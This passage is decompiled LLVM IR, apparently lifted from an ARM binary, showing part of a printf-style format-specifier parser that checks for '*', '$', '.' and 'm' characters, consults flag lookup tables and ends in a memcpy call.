  %v7_11cb4 = icmp eq i8 %v2_11cb0, 42
  br i1 %v7_11cb4, label %dec_label_pc_11cbc, label %dec_label_pc_11d00

dec_label_pc_11cbc:                               ; preds = %dec_label_pc_11cb0
  %v0_11cbc = load i32, i32* %sb.global-to-local, align 4
  %v2_11cbc = icmp eq i32 %v0_11cbc, 0
  br i1 %v2_11cbc, label %dec_label_pc_11cf0, label %dec_label_pc_11cc4

dec_label_pc_11cc4:                               ; preds = %dec_label_pc_11cbc
  %v1_11cc4 = inttoptr i32 %v1_11cf4 to i8*
  %v2_11cc4 = load i8, i8* %v1_11cc4, align 1
  %v3_11cc4 = zext i8 %v2_11cc4 to i32
  store i32 %v3_11cc4, i32* %r3.global-to-local, align 4
  %v7_11cc8 = icmp eq i8 %v2_11cc4, 36
  br i1 %v7_11cc8, label %dec_label_pc_11cd0, label %dec_label_pc_11f78

dec_label_pc_11cd0:                               ; preds = %dec_label_pc_11cc4
  %v0_11cd0 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_11cd0, 1
  br i1 %tmp134, label %dec_label_pc_11f78, label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %dec_label_pc_11cd0
  store i32 %v25_11ae4, i32* %r1.global-to-local, align 4
  %v0_11ce0 = load i32, i32* @lr, align 4
  %v3_11ce0 = mul i32 %v0_11ce0, -4
  %v4_11ce0 = add i32 %v3_11ce0, %v25_11ae4
  store i32 %v4_11ce0, i32* %r3.global-to-local, align 4
  %v1_11ce4 = add i32 %v1_11cf4, 1
  store i32 %v1_11ce4, i32* %r6.global-to-local, align 4
  %v2_11ce8 = add i32 %v4_11ce0, -24
  %v3_11ce8 = inttoptr i32 %v2_11ce8 to i32*
  store i32 %v0_11cd0, i32* %v3_11ce8, align 4
  br label %dec_label_pc_11cfc

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11cbc
  %v1_11cf0 = add i32 %v0_11cf0, 1
  store i32 %v1_11cf0, i32* %r3.global-to-local, align 4
  %v9_11cf4 = icmp eq i32 %v1_11cf0, %v1_11cf4
  br i1 %v9_11cf4, label %dec_label_pc_11cfc, label %dec_label_pc_11f78

dec_label_pc_11cfc:                               ; preds = %dec_label_pc_11cf0, %dec_label_pc_11cd8
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d00

dec_label_pc_11d00:                               ; preds = %dec_label_pc_11cb0, %dec_label_pc_11cfc
  %v0_11d00 = load i32, i32* @lr, align 4
  %v2_11d00 = icmp eq i32 %v0_11d00, 0
  br i1 %v2_11d00, label %dec_label_pc_11d08, label %dec_label_pc_11b20

dec_label_pc_11d08:                               ; preds = %dec_label_pc_11d00
  %v0_11d08 = load i32, i32* %r6.global-to-local, align 4
  %v1_11d08 = inttoptr i32 %v0_11d08 to i8*
  %v2_11d08 = load i8, i8* %v1_11d08, align 1
  %v3_11d08 = zext i8 %v2_11d08 to i32
  store i32 %v3_11d08, i32* %r3.global-to-local, align 4
  %v7_11d0c = icmp eq i8 %v2_11d08, 46
  br i1 %v7_11d0c, label %.thread22, label %dec_label_pc_11d20

.thread22:                                        ; preds = %dec_label_pc_11d08
  %v2_11d10 = add i32 %v0_11d08, 1
  store i32 %v2_11d10, i32* %r6.global-to-local, align 4
  %v1_11d14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_11d14, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_11b88

dec_label_pc_11d20:                               ; preds = %dec_label_pc_11d08
  %v0_11d20 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11d20, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11b20, %dec_label_pc_11d20
  %v0_11d30.pre = phi i32 [ %v0_11d08, %dec_label_pc_11d20 ], [ %v0_11d30.pre.pre, %dec_label_pc_11b20 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_11d20 ], [ %v0_11b20, %dec_label_pc_11b20 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1d664.616 to i32), i32* %r1.global-to-local, align 4
  %v1_11d30 = inttoptr i32 %v0_11d30.pre to i8*
  br label %dec_label_pc_11d2c

dec_label_pc_11d2c:                               ; preds = %dec_label_pc_11d3c, %dec_label_pc_11d28
  %v0_11d3c = phi i32 [ %v1_11d3c, %dec_label_pc_11d3c ], [ ptrtoint ([9 x i8]* @global_var_1d664.616 to i32), %dec_label_pc_11d28 ]
  %v1_11d2c = inttoptr i32 %v0_11d3c to i8*
  %v2_11d2c = load i8, i8* %v1_11d2c, align 1
  %v3_11d2c = zext i8 %v2_11d2c to i32
  store i32 %v3_11d2c, i32* %r2.global-to-local, align 4
  %v2_11d30 = load i8, i8* %v1_11d30, align 1
  %v3_11d30 = zext i8 %v2_11d30 to i32
  store i32 %v3_11d30, i32* %r3.global-to-local, align 4
  %v9_11d34 = icmp eq i8 %v2_11d30, %v2_11d2c
  br i1 %v9_11d34, label %dec_label_pc_11b28, label %dec_label_pc_11d3c

dec_label_pc_11d3c:                               ; preds = %dec_label_pc_11d2c
  %v1_11d3c = add i32 %v0_11d3c, 1
  %v2_11d3c = inttoptr i32 %v1_11d3c to i8*
  %v3_11d3c = load i8, i8* %v2_11d3c, align 1
  %v4_11d3c = zext i8 %v3_11d3c to i32
  store i32 %v4_11d3c, i32* %r3.global-to-local, align 4
  store i32 %v1_11d3c, i32* %r1.global-to-local, align 4
  %v2_11d40 = icmp eq i8 %v3_11d3c, 0
  br i1 %v2_11d40, label %dec_label_pc_11d48, label %dec_label_pc_11d2c

dec_label_pc_11d48:                               ; preds = %dec_label_pc_11d3c, %dec_label_pc_11b28
  %v1_11d68 = phi i32 [ %v1_11b28, %dec_label_pc_11b28 ], [ %v0_11d30.pre, %dec_label_pc_11d3c ]
  %v1_11d64 = phi i32 [ %v0_11d3c, %dec_label_pc_11b28 ], [ %v1_11d3c, %dec_label_pc_11d3c ]
  %v2_11d4c = sub i32 %v1_11d64, ptrtoint ([9 x i8]* @global_var_1d664.616 to i32)
  store i32 %v2_11d4c, i32* %r3.global-to-local, align 4
  %v8_11d54 = icmp sgt i32 %v2_11d4c, 1
  br i1 %v8_11d54, label %.thread25, label %dec_label_pc_11d58

dec_label_pc_11d58:                               ; preds = %dec_label_pc_11d48
  %v1_11d58 = inttoptr i32 %v1_11d68 to i8*
  %v2_11d58 = load i8, i8* %v1_11d58, align 1
  %v3_11d58 = zext i8 %v2_11d58 to i32
  store i32 %v3_11d58, i32* %r2.global-to-local, align 4
  %v1_11d5c = inttoptr i32 %v1_11d64 to i8*
  %v2_11d5c = load i8, i8* %v1_11d5c, align 1
  %v3_11d5c = zext i8 %v2_11d5c to i32
  store i32 %v3_11d5c, i32* %r3.global-to-local, align 4
  %v9_11d60 = icmp eq i8 %v2_11d58, %v2_11d5c
  br i1 %v9_11d60, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_11d58
  %v2_11d64 = add i32 %v1_11d64, 9
  store i32 %v2_11d64, i32* %r1.global-to-local, align 4
  %v2_11d68 = add i32 %v1_11d68, 1
  store i32 %v2_11d68, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_11d58, %dec_label_pc_11d48, %bb135
  %v0_11d70 = phi i32 [ %v1_11d64, %dec_label_pc_11d58 ], [ %v1_11d64, %dec_label_pc_11d48 ], [ %v2_11d64, %bb135 ]
  %v0_11d6c = phi i32 [ %v1_11d68, %dec_label_pc_11d58 ], [ %v1_11d68, %dec_label_pc_11d48 ], [ %v2_11d68, %bb135 ]
  %v1_11d6c = inttoptr i32 %v0_11d6c to i8*
  %v2_11d6c = load i8, i8* %v1_11d6c, align 1
  %v3_11d6c = zext i8 %v2_11d6c to i32
  store i32 %v3_11d6c, i32* %r2.global-to-local, align 4
  %v1_11d70 = add i32 %v0_11d70, 9
  %v2_11d70 = inttoptr i32 %v1_11d70 to i8*
  %v3_11d70 = load i8, i8* %v2_11d70, align 1
  %v4_11d70 = zext i8 %v3_11d70 to i32
  store i32 %v4_11d70, i32* %r3.global-to-local, align 4
  %v2_11d74 = icmp eq i8 %v2_11d6c, 0
  %v3_11d78 = mul nuw nsw i32 %v4_11d70, 256
  store i32 %v3_11d78, i32* @lr, align 4
  br i1 %v2_11d74, label %dec_label_pc_11f78, label %dec_label_pc_11d80

dec_label_pc_11d80:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_1d6a4.618 to i32), i32* %ip.global-to-local, align 4
  %v3_11d84 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_11d84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11d88

dec_label_pc_11d88:                               ; preds = %dec_label_pc_11e0c, %dec_label_pc_11d80
  %v1_11d98 = phi i32 [ %v1_11e0c, %dec_label_pc_11e0c ], [ ptrtoint ([21 x i8]* @global_var_1d6a4.618 to i32), %dec_label_pc_11d80 ]
  %v1_11d88 = inttoptr i32 %v1_11d98 to i8*
  %v2_11d88 = load i8, i8* %v1_11d88, align 1
  %v3_11d88 = zext i8 %v2_11d88 to i32
  store i32 %v3_11d88, i32* %r3.global-to-local, align 4
  %v9_11d8c = icmp eq i8 %v2_11d88, %v2_11d6c
  br i1 %v9_11d8c, label %dec_label_pc_11d94, label %dec_label_pc_11e0c

dec_label_pc_11d94:                               ; preds = %dec_label_pc_11d88
  store i32 ptrtoint ([21 x i8]* @global_var_1d6a4.618 to i32), i32* %r3.global-to-local, align 4
  %v2_11d98 = sub i32 %v1_11d98, ptrtoint ([21 x i8]* @global_var_1d6a4.618 to i32)
  store i32 %v2_11d98, i32* %r2.global-to-local, align 4
  %v7_11da0 = icmp slt i32 %v2_11d98, 18
  br i1 %v7_11da0, label %bb137, label %dec_label_pc_11da4

dec_label_pc_11da4:                               ; preds = %dec_label_pc_11d94
  %v1_11da4 = and i32 %v3_11d78, 1024
  %v2_11da4 = icmp eq i32 %v1_11da4, 0
  br i1 %v2_11da4, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_11da4
  %v2_11da8 = add i32 %v2_11d98, -2
  store i32 %v2_11da8, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_11d94, %dec_label_pc_11da4, %bb136
  %v0_11dac = phi i32 [ %v2_11d98, %dec_label_pc_11d94 ], [ %v2_11d98, %dec_label_pc_11da4 ], [ %v2_11da8, %bb136 ]
  %v1_11dac = load i32, i32* %r7.global-to-local, align 4
  %v2_11dac = add i32 %v1_11dac, 32
  %v3_11dac = inttoptr i32 %v2_11dac to i32*
  store i32 %v0_11dac, i32* %v3_11dac, align 4
  store i32 ptrtoint (i32* @global_var_1d697.620 to i32), i32* %r1.global-to-local, align 4
  %v0_11db8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11db4

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11db4, %bb137
  %v0_11db4 = phi i32 [ %v1_11db4, %dec_label_pc_11db4 ], [ ptrtoint (i32* @global_var_1d697.620 to i32), %bb137 ]
  %v1_11db4 = add i32 %v0_11db4, 1
  %v2_11db4 = inttoptr i32 %v1_11db4 to i8*
  %v3_11db4 = load i8, i8* %v2_11db4, align 1
  %v4_11db4 = zext i8 %v3_11db4 to i32
  store i32 %v4_11db4, i32* %r3.global-to-local, align 4
  store i32 %v1_11db4, i32* %r1.global-to-local, align 4
  %v8_11dbc = icmp sgt i32 %v0_11db8.pre, %v4_11db4
  br i1 %v8_11dbc, label %dec_label_pc_11db4, label %dec_label_pc_11dc0

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11db4
  store i32 ptrtoint (i32* @global_var_1d688.624 to i32), i32* %r0.global-to-local, align 4
  %v2_11dc8 = sub i32 %v1_11db4, ptrtoint (i32* @global_var_1d698.622 to i32)
  %v2_11dcc = mul i32 %v2_11dc8, 2
  store i32 %v2_11dcc, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d678.626 to i32), i32* %ip.global-to-local, align 4
  %v2_11dd4 = add i32 %v2_11dcc, ptrtoint (i32* @global_var_1d688.624 to i32)
  store i32 %v2_11dd4, i32* %r2.global-to-local, align 4
  %v1_11dd8 = add i32 %v2_11dcc, add (i32 ptrtoint (i32* @global_var_1d688.624 to i32), i32 1)
  %v2_11dd8 = inttoptr i32 %v1_11dd8 to i8*
  %v3_11dd8 = load i8, i8* %v2_11dd8, align 1
  %v4_11dd8 = zext i8 %v3_11dd8 to i32
  store i32 %v4_11dd8, i32* %r1.global-to-local, align 4
  %v2_11ddc = add i32 %v2_11dcc, ptrtoint (i32* @global_var_1d678.626 to i32)
  store i32 %v2_11ddc, i32* %r2.global-to-local, align 4
  %v3_11de0 = inttoptr i32 %v2_11dd4 to i8*
  %v4_11de0 = load i8, i8* %v3_11de0, align 2
  %v6_11de0 = zext i8 %v4_11de0 to i32
  store i32 %v6_11de0, i32* %r0.global-to-local, align 4
  %v1_11de4 = add i32 %v2_11dcc, add (i32 ptrtoint (i32* @global_var_1d678.626 to i32), i32 1)
  %v2_11de4 = inttoptr i32 %v1_11de4 to i8*
  %v3_11de4 = load i8, i8* %v2_11de4, align 1
  %v4_11de4 = zext i8 %v3_11de4 to i32
  store i32 %v4_11de4, i32* %r2.global-to-local, align 4
  %v3_11de8 = inttoptr i32 %v2_11ddc to i8*
  %v4_11de8 = load i8, i8* %v3_11de8, align 2
  %v6_11de8 = zext i8 %v4_11de8 to i32
  %v3_11dec = mul nuw i32 %v4_11dd8, 16777216
  store i32 %v3_11dec, i32* %r1.global-to-local, align 4
  %v4_11df0 = sdiv i32 %v3_11dec, 65536
  %v5_11df0 = or i32 %v6_11de0, %v4_11df0
  %v3_11df4 = mul nuw i32 %v4_11de4, 16777216
  store i32 %v3_11df4, i32* %r2.global-to-local, align 4
  %v4_11df8 = sdiv i32 %v3_11df4, 65536
  %v5_11df8 = or i32 %v6_11de8, %v4_11df8
  store i32 %v5_11df8, i32* %r3.global-to-local, align 4
  %v0_11dfc = load i32, i32* @lr, align 4
  %v2_11dfc = or i32 %v5_11df0, %v0_11dfc
  store i32 ptrtoint ([21 x i8]* @global_var_1d6a4.618 to i32), i32* %ip.global-to-local, align 4
  %v2_11e04 = and i32 %v2_11dfc, %v5_11df8
  store i32 %v2_11e04, i32* %r0.global-to-local, align 4
  %v0_11e20.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11e18

dec_label_pc_11e0c:                               ; preds = %dec_label_pc_11d88
  %v1_11e0c = add i32 %v1_11d98, 1
  %v2_11e0c = inttoptr i32 %v1_11e0c to i8*
  %v3_11e0c = load i8, i8* %v2_11e0c, align 1
  %v4_11e0c = zext i8 %v3_11e0c to i32
  store i32 %v4_11e0c, i32* %r3.global-to-local, align 4
  store i32 %v1_11e0c, i32* %ip.global-to-local, align 4
  %v2_11e10 = icmp eq i8 %v3_11e0c, 0
  br i1 %v2_11e10, label %dec_label_pc_11e18, label %dec_label_pc_11d88

dec_label_pc_11e18:                               ; preds = %dec_label_pc_11e0c, %dec_label_pc_11dc0
  %v0_11e24 = phi i32 [ %v0_11dfc, %dec_label_pc_11dc0 ], [ %v3_11d78, %dec_label_pc_11e0c ]
  %v0_11e20 = phi i32 [ %v0_11e20.pre, %dec_label_pc_11dc0 ], [ %v0_11d6c, %dec_label_pc_11e0c ]
  %v0_11e18 = phi i32 [ %v2_11e04, %dec_label_pc_11dc0 ], [ %v3_11d84, %dec_label_pc_11e0c ]
  store i32 %v0_11e18, i32* %stack_var_-36, align 4
  %v0_11e1c = load i32, i32* @r4, align 4
  %v1_11e1c = and i32 %v0_11e1c, 4
  %v1_11e20 = inttoptr i32 %v0_11e20 to i8*
  %v2_11e20 = load i8, i8* %v1_11e20, align 1
  %v3_11e20 = zext i8 %v2_11e20 to i32
  store i32 %v3_11e20, i32* %r1.global-to-local, align 4
  %v1_11e24 = and i32 %v0_11e24, 3840
  %v1_11e28 = and i32 %v0_11e1c, -5
  %v2_11e2c = or i32 %v1_11e28, %v1_11e24
  store i32 %v2_11e2c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_11e1c, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_11e3c = load i32, i32* %r7.global-to-local, align 4
  %v2_11e3c = add i32 %v1_11e3c, 12
  %v3_11e3c = inttoptr i32 %v2_11e3c to i32*
  store i32 %v3_11e20, i32* %v3_11e3c, align 4
  %v0_11e40 = load i32, i32* %r7.global-to-local, align 4
  %v1_11e40 = add i32 %v0_11e40, 4
  %v2_11e40 = inttoptr i32 %v1_11e40 to i32*
  %v3_11e40 = load i32, i32* @r5, align 4
  store i32 %v3_11e40, i32* %v2_11e40, align 4
  %v4_11e40 = add i32 %v0_11e40, 8
  %v5_11e40 = inttoptr i32 %v4_11e40 to i32*
  %v6_11e40 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_11e40, i32* %v5_11e40, align 4
  %v0_11e44 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e44 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e44 = add i32 %v1_11e44, 20
  %v3_11e44 = inttoptr i32 %v2_11e44 to i32*
  store i32 %v0_11e44, i32* %v3_11e44, align 4
  %v0_11e48 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e48 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e48 = add i32 %v1_11e48, 16
  %v3_11e48 = inttoptr i32 %v2_11e48 to i32*
  store i32 %v0_11e48, i32* %v3_11e48, align 4
  %v0_11e4c = load i32, i32* %r0.global-to-local, align 4
  %v1_11e4c = load i32, i32* %r7.global-to-local, align 4
  %v2_11e4c = add i32 %v1_11e4c, 28
  %v3_11e4c = inttoptr i32 %v2_11e4c to i32*
  store i32 %v0_11e4c, i32* %v3_11e4c, align 4
  %v0_11e50 = load i32, i32* %ip.global-to-local, align 4
  %v1_11e50 = inttoptr i32 %v0_11e50 to i8*
  %v2_11e50 = load i8, i8* %v1_11e50, align 1
  %v3_11e50 = zext i8 %v2_11e50 to i32
  store i32 %v3_11e50, i32* %r2.global-to-local, align 4
  %v2_11e54 = icmp eq i8 %v2_11e50, 0
  br i1 %v2_11e54, label %dec_label_pc_11e5c, label %dec_label_pc_11e74

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e18
  %v0_11e5c = load i32, i32* %r6.global-to-local, align 4
  %v1_11e5c = inttoptr i32 %v0_11e5c to i8*
  %v2_11e5c = load i8, i8* %v1_11e5c, align 1
  %v3_11e5c = zext i8 %v2_11e5c to i32
  store i32 %v3_11e5c, i32* %r3.global-to-local, align 4
  %v7_11e60 = icmp eq i8 %v2_11e5c, 109
  br i1 %v7_11e60, label %dec_label_pc_11e68, label %dec_label_pc_11f78

dec_label_pc_11e68:                               ; preds = %dec_label_pc_11e5c
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_11e6c = load i32, i32* %r7.global-to-local, align 4
  %v2_11e6c = add i32 %v1_11e6c, 32
  %v3_11e6c = inttoptr i32 %v2_11e6c to i32*
  store i32 20, i32* %v3_11e6c, align 4
  %v0_11e70 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e70 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e70 = add i32 %v1_11e70, 28
  %v3_11e70 = inttoptr i32 %v2_11e70 to i32*
  store i32 %v0_11e70, i32* %v3_11e70, align 4
  br label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e18, %dec_label_pc_11e68
  %v0_11e74 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_11e74, 1
  br i1 %tmp141, label %dec_label_pc_11f2c, label %dec_label_pc_11e7c

dec_label_pc_11e7c:                               ; preds = %dec_label_pc_11e74
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11e80

dec_label_pc_11e80:                               ; preds = %dec_label_pc_11f14, %dec_label_pc_11e7c
  %v8_11e9c = phi i32 [ 0, %dec_label_pc_11e7c ], [ %v1_11f18, %dec_label_pc_11f14 ]
  %v7_11e84 = icmp sgt i32 %v8_11e9c, 2
  br i1 %v7_11e84, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_11e80
  store i32 %v25_11ae4, i32* %r2.global-to-local, align 4
  %v12_11e88 = mul i32 %v8_11e9c, 4
  %v13_11e88 = add i32 %v12_11e88, %v25_11ae4
  store i32 %v13_11e88, i32* %r3.global-to-local, align 4
  %v9_11e8c = add i32 %v13_11e88, -24
  %v10_11e8c = inttoptr i32 %v9_11e8c to i32*
  %v11_11e8c = load i32, i32* %v10_11e8c, align 4
  store i32 %v11_11e8c, i32* %r2.global-to-local, align 4
  %v9_11e90 = load i32, i32* %r7.global-to-local, align 4
  %v10_11e90 = add i32 %v9_11e90, %v8_11e9c
  store i32 %v10_11e90, i32* %r3.global-to-local, align 4
  %v9_11e98 = trunc i32 %v11_11e8c to i8
  %v11_11e98 = add i32 %v10_11e90, 36
  %v12_11e98 = inttoptr i32 %v11_11e98 to i8*
  store i8 %v9_11e98, i8* %v12_11e98, align 1
  %v8_11ea0 = load i32, i32* %r3.global-to-local, align 4
  %v9_11ea0 = add i32 %v8_11ea0, 36
  %v10_11ea0 = inttoptr i32 %v9_11ea0 to i8*
  %v11_11ea0 = load i8, i8* %v10_11ea0, align 1
  %v12_11ea0 = zext i8 %v11_11ea0 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_11e80
  %v10_11e9c = add i32 %v8_11e9c, %stack_var_-48.3
  store i32 %v10_11e9c, i32* %r3.global-to-local, align 4
  %v9_11ea4 = add i32 %v10_11e9c, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_11ec8 = phi i32 [ %v12_11ea0, %bb142 ], [ %v9_11ea4, %bb143 ]
  store i32 %v0_11ec8, i32* @r2, align 4
  %v1_11ea8 = load i32, i32* %sb.global-to-local, align 4
  %v2_11ea8 = sub i32 %v0_11ec8, %v1_11ea8
  %v4_11ea8 = xor i32 %v1_11ea8, %v0_11ec8
  %v5_11ea8 = xor i32 %v2_11ea8, %v0_11ec8
  %v6_11ea8 = and i32 %v5_11ea8, %v4_11ea8
  %v7_11ea8 = icmp slt i32 %v6_11ea8, 0
  %v8_11ea8 = icmp slt i32 %v2_11ea8, 0
  %v9_11ea8 = icmp eq i32 %v0_11ec8, %v1_11ea8
  %v3_11eac = xor i1 %v8_11ea8, %v7_11ea8
  %v4_11eac = or i1 %v9_11ea8, %v3_11eac
  br i1 %v4_11eac, label %dec_label_pc_11ebc, label %dec_label_pc_11eb0

dec_label_pc_11eb0:                               ; preds = %bb144
  %v1_11eb0 = add i32 %v0_11ec8, -9
  %v3_11eb0 = sub i32 8, %v0_11ec8
  %v4_11eb0 = and i32 %v3_11eb0, %v0_11ec8
  %v5_11eb0 = icmp slt i32 %v4_11eb0, 0
  %v6_11eb0 = icmp slt i32 %v1_11eb0, 0
  %v7_11eb0 = icmp eq i32 %v0_11ec8, 9
  %v3_11eb4 = xor i1 %v6_11eb0, %v5_11eb0
  %v4_11eb4 = or i1 %v7_11eb0, %v3_11eb4
  br i1 %v4_11eb4, label %dec_label_pc_11eb8, label %dec_label_pc_11f78

dec_label_pc_11eb8:                               ; preds = %dec_label_pc_11eb0
  store i32 %v0_11ec8, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11ebc

dec_label_pc_11ebc:                               ; preds = %bb144, %dec_label_pc_11eb8
  store i32 %v25_11ae4, i32* %ip.global-to-local, align 4
  %v1_11ec0 = load i32, i32* %r8.global-to-local, align 4
  %v4_11ec0 = mul i32 %v1_11ec0, 4
  %v5_11ec0 = add i32 %v4_11ec0, %v25_11ae4
  store i32 %v5_11ec0, i32* %r3.global-to-local, align 4
  %v1_11ec4 = add i32 %v5_11ec0, -12
  %v2_11ec4 = inttoptr i32 %v1_11ec4 to i32*
  %v3_11ec4 = load i32, i32* %v2_11ec4, align 4
  store i32 %v3_11ec4, i32* %r5.global-to-local, align 4
  %v1_11ec8 = add i32 %v0_11ec8, -1
  store i32 %v1_11ec8, i32* %sl.global-to-local, align 4
  %v0_11ecc = load i32, i32* %r7.global-to-local, align 4
  %v4_11ecc = mul i32 %v1_11ec8, 4
  %v5_11ecc = add i32 %v0_11ecc, %v4_11ecc
  store i32 %v5_11ecc, i32* %r3.global-to-local, align 4
  %v7_11ed0 = icmp eq i32 %v3_11ec4, 8
  %v1_11ed4 = add i32 %v5_11ecc, 40
  %v2_11ed4 = inttoptr i32 %v1_11ed4 to i32*
  %v3_11ed4 = load i32, i32* %v2_11ed4, align 4
  store i32 %v3_11ed4, i32* @r0, align 4
  br i1 %v7_11ed0, label %dec_label_pc_11f14, label %dec_label_pc_11edc

dec_label_pc_11edc:                               ; preds = %dec_label_pc_11ebc
  %v9_11edc = icmp eq i32 %v3_11ed4, %v3_11ec4
  br i1 %v9_11edc, label %dec_label_pc_11f00, label %bb145

bb145:                                            ; preds = %dec_label_pc_11edc
  %v8_11ee0 = icmp eq i32 %v3_11ed4, 8
  br i1 %v8_11ee0, label %dec_label_pc_11f00, label %dec_label_pc_11ee8

dec_label_pc_11ee8:                               ; preds = %bb145
  %v0_11ee8 = call i32 @_promoted_size()
  %v0_11ef0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11ef0, i32* @r0, align 4
  %v0_11ef4 = call i32 @_promoted_size()
  store i32 %v0_11ef4, i32* %r0.global-to-local, align 4
  %v8_11efc = icmp sgt i32 %v0_11ee8, %v0_11ef4
  br i1 %v8_11efc, label %dec_label_pc_11f14, label %dec_label_pc_11ee8.dec_label_pc_11f00_crit_edge

dec_label_pc_11ee8.dec_label_pc_11f00_crit_edge:  ; preds = %dec_label_pc_11ee8
  %v1_11f04.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_11f0c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_11f0c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11f00

dec_label_pc_11f00:                               ; preds = %dec_label_pc_11ee8.dec_label_pc_11f00_crit_edge, %dec_label_pc_11edc, %bb145
  %v1_11f0c = phi i32 [ %v1_11f0c.pre, %dec_label_pc_11ee8.dec_label_pc_11f00_crit_edge ], [ %v1_11ec8, %dec_label_pc_11edc ], [ %v1_11ec8, %bb145 ]
  %v0_11f0c = phi i32 [ %v0_11f0c.pre, %dec_label_pc_11ee8.dec_label_pc_11f00_crit_edge ], [ %v0_11ecc, %dec_label_pc_11edc ], [ %v0_11ecc, %bb145 ]
  %v1_11f04 = phi i32 [ %v1_11f04.pre, %dec_label_pc_11ee8.dec_label_pc_11f00_crit_edge ], [ %v1_11ec0, %dec_label_pc_11edc ], [ %v1_11ec0, %bb145 ]
  store i32 %v25_11ae4, i32* %r1.global-to-local, align 4
  %v4_11f04 = mul i32 %v1_11f04, 4
  %v5_11f04 = add i32 %v4_11f04, %v25_11ae4
  store i32 %v5_11f04, i32* %r3.global-to-local, align 4
  %v1_11f08 = add i32 %v5_11f04, -12
  %v2_11f08 = inttoptr i32 %v1_11f08 to i32*
  %v3_11f08 = load i32, i32* %v2_11f08, align 4
  store i32 %v3_11f08, i32* @r2, align 4
  %v4_11f0c = mul i32 %v1_11f0c, 4
  %v5_11f0c = add i32 %v4_11f0c, %v0_11f0c
  store i32 %v5_11f0c, i32* %r3.global-to-local, align 4
  %v2_11f10 = add i32 %v5_11f0c, 40
  %v3_11f10 = inttoptr i32 %v2_11f10 to i32*
  store i32 %v3_11f08, i32* %v3_11f10, align 4
  br label %dec_label_pc_11f14

dec_label_pc_11f14:                               ; preds = %dec_label_pc_11ee8, %dec_label_pc_11ebc, %dec_label_pc_11f00
  %v0_11f14 = load i32, i32* %r7.global-to-local, align 4
  %v1_11f14 = add i32 %v0_11f14, 28
  %v2_11f14 = inttoptr i32 %v1_11f14 to i32*
  %v3_11f14 = load i32, i32* %v2_11f14, align 4
  %v0_11f18 = load i32, i32* %r8.global-to-local, align 4
  %v1_11f18 = add i32 %v0_11f18, 1
  store i32 %v1_11f18, i32* %r8.global-to-local, align 4
  %v1_11f1c = add i32 %v3_11f14, 2
  store i32 %v1_11f1c, i32* %r3.global-to-local, align 4
  %v6_11f24 = icmp slt i32 %v1_11f18, %v1_11f1c
  br i1 %v6_11f24, label %dec_label_pc_11e80, label %dec_label_pc_11f44

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11e74
  %v0_11f2c = load i32, i32* %r7.global-to-local, align 4
  %v1_11f2c = add i32 %v0_11f2c, 28
  %v2_11f2c = inttoptr i32 %v1_11f2c to i32*
  %v3_11f2c = load i32, i32* %v2_11f2c, align 4
  store i32 %v3_11f2c, i32* %r2.global-to-local, align 4
  %v0_11f30 = load i32, i32* %r0.global-to-local, align 4
  %v1_11f30 = trunc i32 %v0_11f30 to i8
  %v3_11f30 = add i32 %v0_11f2c, 38
  %v4_11f30 = inttoptr i32 %v3_11f30 to i8*
  store i8 %v1_11f30, i8* %v4_11f30, align 1
  %v0_11f34 = load i32, i32* %r2.global-to-local, align 4
  %v3_11f34 = mul i32 %v0_11f34, 4
  store i32 %v3_11f34, i32* @r2, align 4
  %v0_11f38 = load i32, i32* %r7.global-to-local, align 4
  %v1_11f38 = add i32 %v0_11f38, 40
  store i32 %v1_11f38, i32* @r0, align 4
  %v2_11f3c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11f3c, i32* @r1, align 4
  %v0_11f40 = call i32 @memcpy()
  store i32 %v0_11f40, i32* %r0.global-to-local, align 4
